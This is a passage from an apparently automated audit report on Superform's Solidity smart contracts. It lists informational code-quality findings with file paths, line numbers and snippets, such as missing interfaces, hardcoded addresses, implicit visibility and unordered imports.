228:         emit SetPermit2(permit2_);

285:             emit SetBridgeAddress(bridgeId, bridgeAddress);

286:             emit SetBridgeValidator(bridgeId, bridgeValidatorT);

314:             emit SetAmbAddress(ambId, ambAddress, broadcastAMB);

340:             emit SetStateRegistryAddress(registryId, registryAddress);

```

[228](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L228), [228](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L228), [285](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L285), [286](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L286), [314](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L314), [340](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L340)



### Contract should expose an `interface

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

All `external`/`public` functions should extend an interface. This is useful to ensure that the whole API is extracted and can be more easily integrated by other projects.

*Instances (28)*:

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

87:     function setHyperlaneConfig(IMailbox mailbox_, IInterchainGasPaymaster igp_) external onlyProtocolAdmin {

155:     function setChainId(uint64 superChainId_, uint32 ambChainId_) external onlyProtocolAdmin {

182:     function setReceiver(uint32 domain_, address authorizedImpl_) external onlyProtocolAdmin {

```

[87](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L87), [155](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L155), [182](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L182)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

96:     function setLzEndpoint(address endpoint_) external onlyProtocolAdmin {

106:     function getConfig(
107:             uint16 version_,
108:             uint16 chainId_,
109:             address,
110:             uint256 configType_
111:         )
112:             external
113:             view
114:             returns (bytes memory)
115:         {

149:     function setTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_) external onlyProtocolAdmin {

158:     function isTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_) external view returns (bool) {

211:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

265:     function nonblockingLzReceive(uint16 srcChainId_, bytes memory srcAddress_, bytes memory payload_) public {

274:     function retryMessage(
275:             uint16 srcChainId_,
276:             bytes memory srcAddress_,
277:             uint64 nonce_,
278:             bytes memory payload_
279:         )
280:             public
281:             payable
282:         {

```

[96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L96), [106-115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L106-L115), [149](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L149), [158](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L158), [211](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L211), [265](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L265), [274-282](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L274-L282)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

86:     function setWormholeRelayer(address relayer_) external onlyProtocolAdmin {

208:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

235:     function setReceiver(uint16 chainId_, address authorizedImpl_) external onlyProtocolAdmin {

```

[86](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L86), [208](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L208), [235](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L235)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

96:     function setWormholeCore(address wormhole_) external onlyProtocolAdmin {

106:     function setRelayer(address relayer_) external onlyProtocolAdmin {

114:     function setFinality(uint8 finality_) external onlyProtocolAdmin {

145:     function broadcastPayload(
146:             address, /*srcSender_*/
147:             bytes memory message_,
148:             bytes memory /*extraData_*/
149:         )
150:             external
151:             payable
152:             virtual
153:             onlyValidStateRegistry
154:         {

181:     function receiveMessage(bytes memory encodedMessage_) public onlyWormholeVAARelayer {

217:     function setChainId(uint64 superChainId_, uint16 ambChainId_) external onlyProtocolAdmin {

244:     function setReceiver(uint16 chainId_, address authorizedImpl_) external onlyProtocolAdmin {

```

[96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L96), [106](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L106), [114](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L114), [145-154](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L145-L154), [181](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L181), [217](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L217), [244](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L244)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

490:     function validateSlippage(uint256 finalAmount_, uint256 amount_, uint256 maxSlippage_) public view returns (bool) {

```

[490](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L490)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

92:     function getTimelockPayload(uint256 payloadId_) external view returns (TimelockPayload memory timelockPayload_) {

```

[92](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L92)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

186:     function extractMainParameters(bytes calldata data_)
187:             public
188:             pure
189:             returns (
190:                 string memory bridge,
191:                 address sendingAssetId,
192:                 address receiver,
193:                 uint256 amount,
194:                 uint256 minAmount,
195:                 uint256 destinationChainId,
196:                 bool hasSourceSwaps,
197:                 bool hasDestinationCall
198:             )
199:         {

230:     function extractGenericSwapParameters(bytes calldata data_)
231:             public
232:             pure
233:             returns (
234:                 address sendingAssetId,
235:                 uint256 amount,
236:                 address receiver,
237:                 address receivingAssetId,
238:                 uint256 receivingAmount
239:             )
240:         {

```

[186-199](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L186-L199), [230-240](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L230-L240)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

64:     function withdrawAfterCoolDown(TimelockPayload memory p_)
65:            external
66:            onlyTimelockStateRegistry
67:            returns (uint256 dstAmount)
68:        {

```

[64-68](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L64-L68)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

401:     function estimateAMBFees(
402:             uint8[] memory ambIds_,
403:             uint64 dstChainId_,
404:             bytes memory message_,
405:             bytes[] memory extraData_
406:         )
407:             public
408:             view
409:             returns (uint256 totalFees, uint256[] memory)
410:         {

529:     function updateRegisterAERC20Params(
530:             uint256 totalTransmuterFees_,
531:             bytes memory extraDataForTransmuter_
532:         )
533:             external
534:             onlyEmergencyAdmin
535:         {

589:     function estimateAckCost(uint256 payloadId_) external view returns (uint256 totalFees) {

```

[401-410](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L401-L410), [529-535](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L529-L535), [589](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L589)




### Hardcoded `address` should be avoided

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

It's better to declare the hardcoded addresses as immutable state variables, as this will facilitate deployment on other chains.

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-liquidity/BridgeValidator.sol

15:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L15)

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

21:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L21)




### Some variables have a implicit default visibility

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider always adding an explicit visibility modifier for variables, as the default is `internal`.

*Instances (7)*:

```solidity
File: superform-core/src/SuperformFactory.sol

32:     bytes32 constant SYNC_IMPLEMENTATION_STATUS = keccak256("SYNC_IMPLEMENTATION_STATUS");

```

[32](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L32)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

25:     uint8 constant BROADCAST_REGISTRY_ID = 3;

```

[25](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L25)

```solidity
File: superform-core/src/crosschain-liquidity/BridgeValidator.sol

15:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/BridgeValidator.sol#L15)

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

21:     address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

```

[21](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L21)

```solidity
File: superform-core/src/forms/ERC4626Form.sol

15:     uint8 constant stateRegistryId = 1; // CoreStateRegistry

```

[15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L15)

```solidity
File: superform-core/src/forms/ERC4626KYCDaoForm.sol

18:     uint8 constant stateRegistryId = 1; // CoreStateRegistry

```

[18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626KYCDaoForm.sol#L18)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

26:     uint8 constant stateRegistryId = 2; // TimelockStateRegistry

```

[26](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L26)




### Imports could be organized more systematically

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The contract's interface should be imported first, followed by each of the interfaces it uses, followed by all other files. The examples below do not follow this layout.

*Instances (99)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/Strings.sol

6: import { IERC1155Errors } from "openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/Strings.sol

7: import { IERC1155Receiver } from "openzeppelin-contracts/contracts/token/ERC1155/IERC1155Receiver.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/Strings.sol

8: import { IaERC20 } from "./interfaces/IaERC20.sol";

```

[6](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L6), [7](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L7), [8](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L8)

```solidity
File: ERC1155A/src/aERC20.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/ERC20.sol

5: import { IaERC20 } from "./interfaces/IaERC20.sol";

```

[5](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L5)

```solidity
File: superform-core/src/BaseForm.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165.sol

6: import { IERC165 } from "openzeppelin-contracts/contracts/utils/introspection/IERC165.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165.sol
///        types/DataTypes.sol

8: import { IBaseForm } from "./interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165.sol
///        types/DataTypes.sol

9: import { ISuperRegistry } from "./interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165.sol
///        types/DataTypes.sol
///        libraries/Error.sol

11: import { ISuperformFactory } from "./interfaces/ISuperformFactory.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165.sol
///        types/DataTypes.sol
///        libraries/Error.sol

12: import { IEmergencyQueue } from "./interfaces/IEmergencyQueue.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L6), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L9), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L12)

```solidity
File: superform-core/src/BaseRouter.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

6: import { IBaseRouter } from "./interfaces/IBaseRouter.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

7: import { ISuperRegistry } from "./interfaces/ISuperRegistry.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L7)

```solidity
File: superform-core/src/BaseRouterImplementation.sol

/// @audit Out of order with the below import️:
///        BaseRouter.sol

5: import { IERC20 } from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

7: import { IBaseStateRegistry } from "./interfaces/IBaseStateRegistry.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

8: import { IBaseRouterImplementation } from "./interfaces/IBaseRouterImplementation.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

9: import { IPayMaster } from "./interfaces/IPayMaster.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

10: import { IPaymentHelper } from "./interfaces/IPaymentHelper.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

11: import { ISuperformFactory } from "./interfaces/ISuperformFactory.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

12: import { IBaseForm } from "./interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

13: import { IBridgeValidator } from "./interfaces/IBridgeValidator.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

14: import { ISuperPositions } from "./interfaces/ISuperPositions.sol";

/// @audit Out of order with the below import️:
///        BaseRouter.sol
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        libraries/DataLib.sol
///        libraries/Error.sol

17: import { IPermit2 } from "./vendor/dragonfly-xyz/IPermit2.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L5), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L12), [13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L13), [14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L14), [17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L17)

```solidity
File: superform-core/src/EmergencyQueue.sol

/// @audit Out of order with the below import️:
///        libraries/DataLib.sol

5: import { IBaseForm } from "./interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        libraries/DataLib.sol

6: import { ISuperRegistry } from "./interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        libraries/DataLib.sol

7: import { ISuperRBAC } from "./interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        libraries/DataLib.sol

8: import { IEmergencyQueue } from "./interfaces/IEmergencyQueue.sol";

/// @audit Out of order with the below import️:
///        libraries/DataLib.sol
///        libraries/Error.sol

10: import { ISuperformFactory } from "./interfaces/ISuperformFactory.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L8), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L10)

```solidity
File: superform-core/src/SuperformFactory.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol

5: import { IERC4626 } from "openzeppelin-contracts/contracts/interfaces/IERC4626.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol
///        BaseForm.sol
///        types/DataTypes.sol

8: import { ISuperformFactory } from "./interfaces/ISuperformFactory.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol
///        BaseForm.sol
///        types/DataTypes.sol

9: import { IBaseForm } from "./interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol
///        BaseForm.sol
///        types/DataTypes.sol

10: import { IBroadcastRegistry } from "./interfaces/IBroadcastRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol
///        BaseForm.sol
///        types/DataTypes.sol

11: import { ISuperRBAC } from "./interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/introspection/ERC165Checker.sol
///        BaseForm.sol
///        types/DataTypes.sol

12: import { ISuperRegistry } from "./interfaces/ISuperRegistry.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L5), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L12)

```solidity
File: superform-core/src/SuperformRouter.sol

/// @audit Out of order with the below import️:
///        BaseRouterImplementation.sol
///        BaseRouter.sol

6: import { IBaseRouter } from "./interfaces/IBaseRouter.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L6)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

/// @audit Out of order with the below import️:
///        libraries/Error.sol

5: import { IQuorumManager } from "../interfaces/IQuorumManager.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

6: import { ISuperRegistry } from "../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

7: import { IBaseStateRegistry } from "../interfaces/IBaseStateRegistry.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

8: import { IAmbImplementation } from "../interfaces/IAmbImplementation.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L8)

```solidity
File: superform-core/src/crosschain-data/BroadcastRegistry.sol

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol

5: import { IBroadcastRegistry } from "src/interfaces/IBroadcastRegistry.sol";

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol

6: import { ISuperRegistry } from "src/interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol

7: import { ISuperRBAC } from "src/interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol
///        src/types/DataTypes.sol

9: import { IBroadcastAmbImplementation } from "src/interfaces/IBroadcastAmbImplementation.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L7), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L9)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

/// @audit Out of order with the below import️:
///        src/vendor/hyperlane/StandardHookMetadata.sol

8: import { IMessageRecipient } from "src/vendor/hyperlane/IMessageRecipient.sol";

/// @audit Out of order with the below import️:
///        src/vendor/hyperlane/StandardHookMetadata.sol

9: import { ISuperRBAC } from "src/interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        src/vendor/hyperlane/StandardHookMetadata.sol

10: import { ISuperRegistry } from "src/interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        src/vendor/hyperlane/StandardHookMetadata.sol

11: import { IInterchainGasPaymaster } from "src/vendor/hyperlane/IInterchainGasPaymaster.sol";

```

[8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L11)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

/// @audit Out of order with the below import️:
///        src/types/DataTypes.sol
///        src/libraries/Error.sol

10: import { ILayerZeroReceiver } from "src/vendor/layerzero/ILayerZeroReceiver.sol";

/// @audit Out of order with the below import️:
///        src/types/DataTypes.sol
///        src/libraries/Error.sol

11: import { ILayerZeroUserApplicationConfig } from "src/vendor/layerzero/ILayerZeroUserApplicationConfig.sol";

/// @audit Out of order with the below import️:
///        src/types/DataTypes.sol
///        src/libraries/Error.sol

